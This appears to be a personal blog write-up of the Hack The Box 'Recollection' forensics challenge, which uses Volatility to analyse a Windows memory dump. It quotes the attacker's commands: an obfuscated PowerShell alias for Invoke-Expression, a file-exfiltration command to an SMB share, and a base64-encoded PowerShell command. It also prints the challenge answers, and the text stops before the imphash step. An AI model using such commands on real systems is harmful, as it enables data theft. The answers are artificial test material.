---
title: Hack the Box Sherlock Challenge 1 - Recollection
published: 2024-03-07
description: ''
image: './covers/htb-sherlock-recollection.png'
tags: ["Reverse Engineering", "Cyber Security"]
category: Writeups
draft: false 
---

# Programs/Applications Used

- Kali Linux
- Radare2
- Volitility2/3

# Useful Links

- https://github.com/volatilityfoundation/volatility3
- https://github.com/volatilityfoundation/volatility
- https://yara.readthedocs.io/en/stable/gettingstarted.html

# Preliminary Steps

The first initial step was to setup my Dockerfile for Kali and the tools I felt were necessary.

![Binary after unpacking and initial zip](@assets/htb-photos/screencaps/htb-sherlock/recollection/1.png)

I then noticed radare2 doesn't come preinstalled in the container, so just used apt to get it after updating/upgrading the container.

- Commands:
    - `podman build -f docker/Dockerfile -t kali-env .`
    - `podman run -it --rm -v "$(pwd)":/usr/project:Z kali-env`

# Analysis

The first question of this module is:

- What is the Operating System of the machine?

So the first idea was just to check out the file in general and get some basic information:

![Binary information](@assets/htb-photos/screencaps/htb-sherlock/recollection/2.png)

After that, I looked [here](https://learn.microsoft.com/en-us/windows/win32/msi/productname) and noticed that `productName` should yield the name of the OS, if it's Windows. Thankfully:

![Binary information](@assets/htb-photos/screencaps/htb-sherlock/recollection/3.png)

So the next question will be:

- When was the memory dump created?

I spent some time trying to look for specific properties such as `creationDate`, using a regular expression `[0-9]{4}[/.-][0-9]{2}[/.-][0-9]{2}`, `createdDateTime`, etc. but nothing was coming back that seemed useful. (or it gave back 5000+ entries) So I looked for a different tool, and found `volatility3`.

So, after much testing I decided to alter my Dockerfile a bit for our new tools and installs to:

![Dockerfile update](@assets/htb-photos/screencaps/htb-sherlock/recollection/4.png)

Then, using this command `python3 /opt/volatility3/vol.py -f recollection.bin windows.info.Info` we are given the answer:

![Binary information](@assets/htb-photos/screencaps/htb-sherlock/recollection/5.png)

Which gave us the system time the dump was created: `2022-12-19 16:07:30`

Next question we're asked is:

- After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

I went back to using `radare2`, an used the command: `/ powershell.exe` to find any hits. Once I did this, I used `V` to go into visual mode, then would press `n` to check around at different hits and see if I could find the command. But even still, passing through this many entries is taxing. So instead, I decided to try `volatility3` again.

However, something worth noting is that the clipboard plugin is only available for `volatility2` not `volatility3`. So, I needed to install `volatility2` in order to use this.

So after altering my Dockerfile to include `volatility2` and the needed libraries/packages, I went ahead and used `python2 /opt/volatility2/vol.py -f recollection.bin imageinfo` so I could see which profile the binary has.

![Volatility2 image info](@assets/htb-photos/screencaps/htb-sherlock/recollection/6.png)

We can see the recommended profiles, so I figured I'd try the first recommended profile: Win7SP1x64
With this command: `python2 /opt/volatility2/vol.py -f recollection.bin --profile=Win7SP1x64 clipboard`

![Volatility2 clipboard output](@assets/htb-photos/screencaps/htb-sherlock/recollection/7.png)

Which thankfully gave us the command copied: `(gv '*MDR*').naMe[3,11,2]-joIN''`

And then we move to the next question:

- The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

For this question, I found the `consoles` plugin useful through this command: `python2 /opt/volatility2/vol.py -f recollection.bin --profile=Win7SP1x64 consoles`

![Volatility2 consoles output](@assets/htb-photos/screencaps/htb-sherlock/recollection/8.png)

Noting it says `iex`, I looked it up and found this https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4 which I believe would point us towards the answer being: `Invoke-Expression`

The next question is:

- A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

Now I used the `cmdscan` plugin with: `python2 /opt/volatility2/vol.py -f recollection.bin --profile=Win7SP1x64 cmdscan`

![Volatility2 cmdscan output](@assets/htb-photos/screencaps/htb-sherlock/recollection/9.png)

Which yields the answer: `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`

Here is the next question:

- Following the above command, now tell us if the file was exfiltrated successfully?

If we look back up in our `consoles` run, it can be noted that an `ls` command is ran after executing the script. There is no pass.txt files, so the answer is `NO`.

![Volatility2 cmdscan output](@assets/htb-photos/screencaps/htb-sherlock/recollection/10.png)

With that question answered, we move to the next question:

- The attacker tried to create a readme file. What was the full path of the file?

I couldn't find anything that I thought would help me as far as plugins go, and I also didn't feel like using `radare2` for this task. But I did find this post https://isc.sans.edu/diary/Using+Yara+rules+with+Volatility/22950 that points towards using `yara` with `volitility`. So I decided to take a crack at doing this:

![yara rules file](@assets/htb-photos/screencaps/htb-sherlock/recollection/11.png)

Using this file and this command: `python2 /opt/volatility2/vol.py -f recollection.bin --profile=Win7SP1x64 yarascan -Y search_readme.yara`

![yara rules file attempt](@assets/htb-photos/screencaps/htb-sherlock/recollection/12.png)

However, it then dawned on me looking over my previous commands, specifically the use of the `cmdscan`, that there's a command directly underneath there that is echoing a strange string. `powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"` 

I tossed that string into Google, and it pulled up a bunch of base64 encoding links, so I went to `cyberchef` and low and behold, it gave me the answer!

![cyberchef output](@assets/htb-photos/screencaps/htb-sherlock/recollection/13.png)

Though you could also do this with a command:

![string decode](@assets/htb-photos/screencaps/htb-sherlock/recollection/14.png)

But either way, the answer is given: `C:\Users\Public\Office\readme.txt`

So now, the next question:

- What was the Host Name of the machine?

As we seem to be on a `volitility` train, I'll use that with this command: `python2 /opt/volatility2/vol.py -f recollection.bin --profile=Win7SP1x64 envars`

This command gave us a lot of output, but amongst it was the answer: User-PC

![envars output](@assets/htb-photos/screencaps/htb-sherlock/recollection/15.png)

Now, the next question is:

- How many user accounts were in the machine?

So I noticed in my output from envars that there was a variable named `USERNAME`, so I just altered my command a bit to hand me all of those and then counted: `python2 /opt/volatility2/vol.py -f recollection.bin --profile=Win7SP1x64 envars | grep USERNAME`

The above command yields us 3 accounts.

![envars output with grep](@assets/htb-photos/screencaps/htb-sherlock/recollection/16.png)

Now, the next question:

- In the "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

So I looked through the documentation and noticed there's a plugin called `filescan` which seemed to be what was needed here. Running it creates a lot of entries, so instead decided to grep for what I needed: `python2 /opt/volatility2/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep passwords.txt`

![envars output with grep](@assets/htb-photos/screencaps/htb-sherlock/recollection/17.png)

Leaving the answer: `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`

Which leads us to the next question:

- A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?

From our `consoles` plugin output earlier I remember seeing the files list that had an exe in it, which turns out IS the answer!

![envars output with grep](@assets/htb-photos/screencaps/htb-sherlock/recollection/18.png)

Meaning: `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1` is the answer.

Now on to the next question:

- Following the previous question, what is the Imphash of the malicous file you found above?

So for this one, I wanted to do this one just a bit more programmatically. First step was installing `pefile` and then making a quick python script for it.


